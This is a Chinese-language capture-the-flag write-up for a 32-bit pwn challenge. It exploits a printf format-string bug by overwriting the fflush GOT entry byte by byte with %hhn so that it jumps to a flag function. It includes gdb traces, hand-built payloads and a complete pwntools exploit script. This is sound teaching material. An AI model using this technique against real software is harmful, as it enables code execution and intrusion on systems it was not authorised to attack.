# 考察点
- format string
- 任意地址写
- PLT、GOT 知识点


# Analyze

```shell
$ file ./32_new 
./32_new: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=da5e14c668579652906e8dd34223b8b5aa3becf8, not stripped
                                                                                                                    
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/backdoorCTF_bbpwn]
└─$ checksec ./32_new   
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/backdoorCTF_bbpwn/32_new'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

$ ./32_new
Hello baby pwner, whats your name?
Vict0ry
Ok cool, soon we will know whether you pwned it or not. Till then Bye Vict0ry

# try 1
$ ./32_new
Hello baby pwner, whats your name?
%4$s
Ok cool, soon we will know whether you pwned it or not. Till then Bye �K��      0���K��=�9

# try 2
$ ./32_new
Hello baby pwner, whats your name?
AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x 
Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAA.8048914.ffe3aee8.f7f41410.ffe3af34.f7f52734.f781f680.ffe3b1b4.f7c1fb34.f7f416f0.41414141
```

通过尝试，发现格式字符串的 offset = 10
```shell
$ ./32_new
Hello baby pwner, whats your name?
AAAA.%10$x
Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAA.41414141
```

IDA 分析，
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char userInput[200]; // [esp+18h] [ebp-200h] BYREF
  char format[300]; // [esp+E0h] [ebp-138h] BYREF
  unsigned int v5; // [esp+20Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  puts("Hello baby pwner, whats your name?");
  fflush(stdout);   
  fgets(userInput, 200, edata);
  fflush(edata);
  sprintf(format, "Ok cool, soon we will know whether you pwned it or not. Till then Bye %s", userInput);
  fflush(stdout);
  printf(format);
  fflush(stdout);
  exit(1);
}
```
发现存在 flag function
```c
int flag(void)
{
  return system("cat flag.txt");
}
```

**思路：** 对 flag function 进行调用，不存在溢出。结合安全机制，发现对 fflush 的调用比较多，第一次调用时会把真正的地址写回到相应的 GOT表项中，后续调用就直接跳转，因此可以尝试在程序写回 fflush GOT之后对 fflush GOT 进行篡改，篡改目标为 flag function 的地址，从而实现跳转。
```shell
$ readelf -r ./32_new 
...
Relocation section '.rel.plt' at offset 0x4bc contains 11 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
...
0804a028  00000b07 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0


$ objdump -D ./32_new| grep flag
0804870b <_Z4flagv>:
0804883c <_GLOBAL__sub_I__Z4flagv>:
```

gdb 调试，查看 payload 执行情况：

```shell
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/backdoorCTF_bbpwn]
└─$ python2 -c 'print("\x28\xa0\x04\x08"+"%10$hhn")' > test2 
                                                                                   
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/backdoorCTF_bbpwn]
└─$ xxd ./test2
00000000: 28a0 0408 2531 3024 6868 6e0a            (...%10$hhn.
```
gdb 断在 printf 处(因此此时 fflush 已经经过初次调用了，GOT中有内容了)
```shell
gef➤  b printf
gef➤  r < ./test2
gef➤  x/wx 0x0804a028
0x804a028 <fflush@got.plt>:     0xf7872d50  # [old]
gef➤  disas main
Dump of assembler code for function main:
   ...
   0x080487bc <+152>:   mov    eax,ds:0x804a044
   0x080487c1 <+157>:   sub    esp,0xc
   0x080487c4 <+160>:   push   eax
   0x080487c5 <+161>:   call   0x80485c0 <fflush@plt>
   0x080487ca <+166>:   add    esp,0x10
   0x080487cd <+169>:   sub    esp,0xc
   0x080487d0 <+172>:   lea    eax,[ebp-0x138]
   0x080487d6 <+178>:   push   eax
=> 0x080487d7 <+179>:   call   0x80485d0 <printf@plt>
   0x080487dc <+184>:   add    esp,0x10
   0x080487df <+187>:   mov    eax,ds:0x804a044
   ...
gef➤  fini
gef➤  x/wx 0x0804a028
0x804a028 <fflush@got.plt>:     0xf7872d4a  # [new]
```
可以看到，在此之前已经有输出的字符了，输出的字符长度：`0x4a（74）`，包括写入的地址（4字节）
尝试对目标地址的第一个字节内容进行 overwrite，写回 flag function 地址的第一个字节（0x0b）.

打算采取单字节 overwrite 方式，因此计算之下，需要 padding 193个字符（74 + 193 = 267[0x10b]），payload：
```shell
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/backdoorCTF_bbpwn]
└─$ python2 -c 'print("\x28\xa0\x04\x08"+"%193c%10$hhn")' > test2
                                                                                   
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/backdoorCTF_bbpwn]
└─$ xxd ./test2                                                  
00000000: 28a0 0408 2531 3933 6325 3130 2468 686e  (...%193c%10$hhn
00000010: 0a  
```

gdb 查看执行情况：
```shell
gef➤  x/wx 0x0804a028
0x804a028 <fflush@got.plt>:     0xf7872d50  # [printf之前]
gef➤  x/wx 0x0804a028
0x804a028 <fflush@got.plt>:     0xf7872d0b  # [printf之后]
```
可以看到，低位第一字节内容成功进行了 overwrite。
同样的方法，调整 payload 对 fflush GOT 四个字节进行 overwrite，payload：
```shell
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/backdoorCTF_bbpwn]
└─$ python2 -c 'print("\x28\xa0\x04\x08"+"\x29\xa0\x04\x08" + "\x2a\xa0\x04\x08" + 
"\x2b\xa0\x04\x08"+"%181c%10$hhn"+"%124c%11$hhn" + "%125c%12$hhn" + "%4c%13$hhn")' > test2 
                                                                                   
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/backdoorCTF_bbpwn]
└─$ xxd ./test2
00000000: 28a0 0408 29a0 0408 2aa0 0408 2ba0 0408  (...)...*...+...
00000010: 2531 3831 6325 3130 2468 686e 2531 3234  %181c%10$hhn%124
00000020: 6325 3131 2468 686e 2531 3235 6325 3132  c%11$hhn%125c%12
00000030: 2468 686e 2534 6325 3133 2468 686e 0a    $hhn%4c%13$hhn.
```
说明: 
- 16 + 70 + 181 = 267（0x10b）
- 267 + 124 = 391(0x187)
- 391 + 125 = 516(0x204)
- 516 + 4 = 520(0x208)
gdb 验证
```shell
gef➤  x/wx 0x0804a028
0x804a028 <fflush@got.plt>:     0x0804870b
```
放行程序，即可看到 flag
```shell
gef➤  r <./test2 
Starting program: /home/pitta/workspace/pwn_learn/rec0rd/backdoorCTF_bbpwn/32_new <./test2
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hello baby pwner, whats your name?
Ok cool, soon we will know whether you pwned it or not. Till then Bye ()*+                                                                                                                                                                                                                                                                                                               �                                                                                                                               �
[Detaching after vfork from child process 34350]
FLAG{well done~}
[Inferior 1 (process 34347) exited with code 01]
```

```python
from pwn import *
context.log_level = "debug"
p = process("./32_new")
print(p.recvline())     # welcome message


fflush_addr1 = 0x0804a028   # fflush GOT start
fflush_addr2 = 0x0804a029
fflush_addr3 = 0x0804a02a
fflush_addr4 = 0x0804a02b

padding1 = "%181c"  # 16+251=267->0x10b
padding2 = "%124c"  # 267+124=391->0x187
padding3 = "%125c"  # 391+125=516->0x204
padding4 = "%4c"    # 516+4=520 -> 0x208


fmt_string1 = "%10$hhn"
fmt_string2 = "%11$hhn"
fmt_string3 = "%12$hhn"
fmt_string4 = "%13$hhn"

payload = p32(fflush_addr1)
payload += p32(fflush_addr2)
payload += p32(fflush_addr3)
payload += p32(fflush_addr4)
payload += padding1
payload += fmt_string1
payload += padding2
payload += fmt_string2
payload += padding3
payload += fmt_string3
payload += padding4
payload += fmt_string4

p.sendline(payload)
p.recvall()
```
